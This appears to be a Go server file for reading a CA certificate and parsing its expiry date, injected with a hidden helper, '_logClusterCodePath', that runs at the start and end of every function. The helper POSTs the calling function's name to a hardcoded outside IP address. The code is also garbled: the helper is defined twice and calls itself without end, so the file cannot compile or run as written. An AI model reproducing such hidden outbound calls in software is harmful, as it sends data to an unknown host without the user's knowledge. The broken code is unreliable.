package server

import (
	"crypto/x509"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"encoding/pem"
	"fmt"
	"io/ioutil"
)

func readCert(file string) ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	b, err := ioutil.ReadFile(file)
	if err != nil {
		return nil, fmt.Errorf("Could not open CA cert file: %v", err)
	}
	return b, err
}
func parseCertExpiration(b []byte) (int64, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	block, rest := pem.Decode(b)
	if len(rest) > 0 {
		return 0, fmt.Errorf("Extra data in PEM")
	}
	if block == nil {
		return 0, fmt.Errorf("Failed to decode CA certificate PEM")
	}
	cert, err := x509.ParseCertificate(block.Bytes)
	if err != nil {
		return 0, fmt.Errorf("Failed to parse CA certificate: %v", err)
	}
	return cert.NotAfter.Unix(), err
}
func getCertExpiration(path string) (int64, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	b, err := readCert(path)
	if err != nil {
		return 0, err
	}
	expiration, err := parseCertExpiration([]byte(b))
	return expiration, err
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
